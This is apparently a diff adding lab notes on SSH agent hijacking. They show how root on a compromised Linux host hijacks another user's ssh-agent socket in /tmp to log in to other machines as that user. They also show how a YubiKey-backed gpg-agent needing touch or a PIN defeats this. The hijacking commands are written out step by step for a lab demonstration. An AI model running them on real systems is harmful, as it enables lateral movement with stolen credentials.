@@ -1,0 +1,39 @@
+
+# assume the attacker has already compromised the host and elevated privileges
+
+___________________________________________________________________________________
+BASE SYSTEM (Linux-base)
+___________________________________________________________________________________
+as larry:
+1. eval `ssh-agent` 
+2. ssh-add ./.ssh/id_rsa
+the agent now has access to the key, it creates a tmp file that is a socket to the agent
+
+
+as ansible su to root:
+1. ls /tmp | grep ssh
+2. export SSH_AUTH_SOCK=/tmp/ssh-XXXXXXXXX/agent.YYY (replace the X and Y with the actual numbers)
+3. ssh larry@Linux-Base-Server.sshlab -v
+
+Notice that an elevated attacker now has access to any machines the user's key can authenticate to.
+This can be mitigated by locking the agent (ssh-add -x)
+___________________________________________________________________________________
+HARDENED SYSTEM
+___________________________________________________________________________________
+
+as larry with the appropriate yubikey connected (via usb or netusb):
+
+1. export GPG_TTY="$(tty)"
+2. export SSH_AUTH_SOCK=$(gpgconf --list-dirs agent-ssh-socket)
+3. gpgconf --launch gpg-agent 
+4. ssh-add ./.ssh/id_rsa
+the gpg-agent now has access to the key and acts as an ssh-agent. If the Yubikey has been programed to require touch or a pin (recommended) it will be needed each time the agent is used.
+
+as ansible su to root:
+1. ls /tmp | grep ssh
+# there is no ssh-agent here, the gpg agent is usually located in /run/user/1000/gnupg/S.gpg-agent.ssh
+2. export SSH_AUTH_SOCK=/run/user/1000/gnupg/S.gpg-agent.ssh
+3. the request will prompt for a pin and a touch of the yubikey
+
+Note the attack should not work if the yubikey is set up correctly
+
